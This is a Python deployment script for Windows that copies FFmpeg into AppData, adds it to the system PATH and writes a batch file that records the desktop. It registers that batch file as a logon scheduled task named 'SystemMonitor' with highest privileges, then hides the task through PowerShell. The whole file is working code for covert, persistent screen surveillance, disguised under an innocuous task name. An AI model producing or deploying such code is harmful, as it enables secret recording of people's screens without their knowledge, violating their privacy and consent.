import os
import shutil
import sys
import ctypes
import winreg
import subprocess
import datetime

def is_admin():
    """Check if running as admin."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def copy_ffmpeg_to_appdata():
    """Copy FFmpeg to AppData/Local."""
    current_dir = os.path.dirname(os.path.abspath(__file__))
    ffmpeg_source = os.path.join(current_dir, "ffmpeg")
    ffmpeg_dest = os.path.join(os.environ["LOCALAPPDATA"], "ffmpeg")

    os.makedirs(ffmpeg_dest, exist_ok=True)
    try:
        if os.path.exists(ffmpeg_dest):
            shutil.rmtree(ffmpeg_dest)
        shutil.copytree(ffmpeg_source, ffmpeg_dest)
        print(f"[+] FFmpeg copied to: {ffmpeg_dest}")
        return ffmpeg_dest
    except Exception as e:
        print(f"[-] Error copying FFmpeg: {e}")
        sys.exit(1)

def add_ffmpeg_to_path(ffmpeg_path):
    """Add FFmpeg to system PATH."""
    bin_path = os.path.join(ffmpeg_path, "bin")
    try:
        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment",
            0, winreg.KEY_ALL_ACCESS
        ) as key:
            current_path = winreg.QueryValueEx(key, "Path")[0]
            if bin_path not in current_path:
                new_path = f"{current_path};{bin_path}"
                winreg.SetValueEx(key, "Path", 0, winreg.REG_EXPAND_SZ, new_path)
                print(f"[+] Added to PATH: {bin_path}")
                ctypes.windll.user32.SendMessageTimeoutW(0xFFFF, 0x001A, 0, "Environment", 0x0002, 1000, None)
    except Exception as e:
        print(f"[-] Failed to update PATH: {e}")
        sys.exit(1)


def create_scheduled_task(ffmpeg_path):
    """Create hidden scheduled task that actually works."""
    recordings_dir = os.path.join(ffmpeg_path, "records")
    os.makedirs(recordings_dir, exist_ok=True)

    ffmpeg_exe = os.path.join(ffmpeg_path, "bin", "ffmpeg.exe")
    output_file = os.path.join(recordings_dir, "output_test.mp4")
    
    # Batch script using environment variables
    batch_content = f"""@echo off
:: Get current date and time
for /f "tokens=2 delims==" %%A in ('wmic OS Get localdatetime /value') do set datetime=%%A

:: Extract date and time components
set year=%datetime:~0,4%
set month=%datetime:~4,2%
set day=%datetime:~6,2%
set hour=%datetime:~8,2%
set minute=%datetime:~10,2%
set second=%datetime:~12,2%

:: Format filename
set output_file="{ffmpeg_path}\\records\\output_%year%-%month%-%day%_%hour%-%minute%-%second%.mp4"

"{ffmpeg_exe}" -f gdigrab -framerate 15 -i desktop ^
-c:v libx264 -preset ultrafast -crf 28 ^
-pix_fmt yuv420p -video_size 640x480 "%output_file%"
"""
    batch_path = os.path.join(ffmpeg_path, "start_recording.bat")
    with open(batch_path, 'w') as f:
        f.write(batch_content)

    task_name = "SystemMonitor"
    current_user = os.getlogin()

    # Create task that runs under the current user
    command = (
        f'schtasks /create /tn "{task_name}" /tr "\"{batch_path}\"" '
        f'/sc onlogon /rl HIGHEST /ru "{current_user}" /f'
    )

    try:
        subprocess.run(command, check=True, shell=True)
        print(f"[+] Scheduled task '{task_name}' created for user '{current_user}'")

        # Optional: hide the task (requires PowerShell)
        hide_command = (
            f'$task = Get-ScheduledTask -TaskName "{task_name}"; '
            '$task.Settings.Hidden = $true; '
            'Set-ScheduledTask -InputObject $task'
        )
        subprocess.run(["powershell", "-Command", hide_command], check=True)
        print("[+] Task hidden successfully")

    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to create scheduled task: {e}")
        sys.exit(1)

def main():
    if not is_admin():
        print("[!] Run as Administrator (required for PATH/Task Scheduler).")
        sys.exit(1)

    ffmpeg_path = copy_ffmpeg_to_appdata()
    add_ffmpeg_to_path(ffmpeg_path)
    create_scheduled_task(ffmpeg_path)
    print("[+] Deployment complete! FFmpeg will create records.")

if __name__ == "__main__":
    main()